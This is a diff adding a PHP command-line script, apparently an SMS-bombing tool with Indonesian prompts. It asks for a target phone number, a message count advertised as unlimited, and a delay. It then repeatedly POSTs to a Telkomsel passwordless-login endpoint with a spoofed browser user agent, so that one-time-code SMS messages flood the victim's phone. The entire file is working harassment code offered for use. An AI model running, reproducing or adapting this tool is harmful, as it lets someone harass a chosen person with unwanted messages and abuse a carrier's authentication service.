@@ -1,0 +1,64 @@
+<?php
+# Ahmad Khoirul Marzuqin
+$n = "\e[0m"; # Normal
+# Ahmad Khoirul Marzuqin
+$c = "\e[90m"; # Coklat
+# Ahmad Khoirul Marzuqin
+$m = "\e[91m"; # Merah
+# Ahmad Khoirul Marzuqin
+$h = "\e[92m"; # Hijau
+# Ahmad Khoirul Marzuqin
+$k = "\e[93m"; # Kuning
+# Ahmad Khoirul Marzuqin
+$u = "\e[94m"; # Ungu
+# Ahmad Khoirul Marzuqin
+$p = "\e[95m"; # Pink
+# Ahmad Khoirul Marzuqin
+$b = "\e[96m"; # Biru
+# Ahmad Khoirul Marzuqin
+echo "$u             ╔════════════════════════╗
+             ║$k Sms      :$h TSEL-APPS$u   ║
+             ║$k Maksimal :$h Tanpa Batas$u ║
+             ╚════════════════════════╝
+
+╔═╗
+║".$n."›".$u."║$k Nomor Target       :$h ";
+# Ahmad Khoirul Marzuqin
+$nomor = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║".$n."›".$u."║$h Jumlah Pesan Sms   :$k ";
+# Ahmad Khoirul Marzuqin
+$jumlah = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║".$n."›".$u."║$p Jeda Pesan Per Sms :$b ";
+# Ahmad Khoirul Marzuqin
+$jeda = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║ ║\n";
+# Ahmad Khoirul Marzuqin
+for ($j=1; $j <= $jumlah; $j++) {
+$cp = "phone_number=%2B".$nomor."&connection=sms";
+$cr = "https://my.telkomsel.com/";
+$cu = "https://tdwidm.telkomsel.com/passwordless/start";
+$cua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";
+$ci = curl_init();
+curl_setopt($ci, CURLOPT_POST, 1);
+curl_setopt($ci, CURLOPT_POSTFIELDS, $cp);
+curl_setopt($ci, CURLOPT_REFERER, $cr);
+curl_setopt($ci, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ci, CURLOPT_URL, $cu);
+curl_setopt($ci, CURLOPT_USERAGENT, $cua);
+sleep($jeda);
+$ce = curl_exec($ci);
+curl_close($ci);
+preg_match("/_id/", $ce, $kodece);
+if ($kodece[0] == "_id") {
+echo $u."║".$n."›".$u."║$p Mengirim Pesan Sms :$b $j$h ✓                    \r";
+}else{
+echo $u."║".$n."›".$u."║$m !!! Jeda Pesan$n Atau$m Koneksi Internet !!!$b $j$m X\r";
+}
+}
+# Ahmad Khoirul Marzuqin
+echo "$u\n╚═╝\n";
+# Ahmad Khoirul Marzuqin
+?>
